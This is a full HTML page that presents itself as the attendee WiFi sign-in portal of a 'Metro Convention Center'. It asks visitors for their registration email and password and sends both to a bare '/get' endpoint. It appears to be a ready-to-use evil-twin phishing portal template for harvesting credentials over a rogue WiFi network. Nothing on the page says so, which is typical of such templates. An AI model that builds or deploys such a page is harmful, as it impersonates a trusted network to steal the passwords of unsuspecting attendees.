<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Convention Center — Event WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#eef1f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:430px;background:#fff;border-radius:10px;overflow:hidden;box-shadow:0 6px 40px rgba(0,0,0,0.09)}
.top{background:linear-gradient(135deg,#1e3a5f,#2a5298);padding:24px 28px 18px;display:flex;align-items:center;gap:14px}
.building{width:44px;height:44px;background:rgba(255,255,255,0.1);border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0}
.top-text .cc-name{font-size:15px;font-weight:700;color:#fff}
.top-text .cc-sub{font-size:10px;color:rgba(255,255,255,0.5);margin-top:3px}
.event-bar{background:#f0f4f8;border-bottom:1px solid #e0e8f0;padding:8px 28px;display:flex;align-items:center;justify-content:space-between}
.ssid-grp{display:flex;align-items:center;gap:7px}
.dot{width:6px;height:6px;background:#4ade80;border-radius:50%}
.ssid-grp span{font-size:11px;color:#8a9ab0}
.ssid-grp strong{color:#2a5298;font-weight:600}
.event-name{font-size:10px;color:#aaa;font-weight:500}
.body{padding:24px 28px 20px}
h2{font-size:17px;font-weight:700;color:#1e3a5f;margin-bottom:3px}
.sub{font-size:12.5px;color:#aaa;margin-bottom:18px}
.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:#aaa;margin-bottom:7px;margin-top:18px}
input{width:100%;padding:12px 14px;border:1.5px solid #e0e8f0;border-radius:8px;font-size:14.5px;background:#f5f8fc;color:#1e3a5f}
input:focus{outline:none;border-color:#2a5298;box-shadow:0 0 0 3px rgba(42,82,152,0.08)}
input::placeholder{color:#c0cce0}
.btn{width:100%;padding:13px;margin-top:20px;border:none;border-radius:8px;background:#2a5298;color:#fff;font-size:13px;font-weight:700;cursor:pointer}
.terms{font-size:11px;color:#c0cce0;text-align:center;margin-top:13px;line-height:1.6}
.terms a{color:#2a5298}
.foot{background:#f5f8fc;border-top:1px solid #e0e8f0;padding:12px 28px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#c0cce0;text-decoration:none}
.foot a{color:#2a5298}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="building">🏛</div>
    <div class="top-text">
      <div class="cc-name">Metro Convention Center</div>
      <div class="cc-sub">Event &amp; Conference WiFi Services</div>
    </div>
  </div>
  <div class="event-bar">
    <div class="ssid-grp"><div class="dot"></div><span>Network: <strong>MCC-EventWiFi</strong></span></div>
    <span class="event-name">All Halls</span>
  </div>
  <div class="body">
    <h2>Attendee WiFi Access</h2>
    <p class="sub">Sign in with your registration email to access event WiFi.</p>
    <form action="/get">
      <label class="lbl">Registration Email</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Connect to Event WiFi</button>
      <p class="terms">By connecting you agree to the <a href="#">Acceptable Use Policy</a>. For event attendees only.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; Metro Convention Center</span><a href="#">IT Support</a></div>
</div>
</body>
</html>
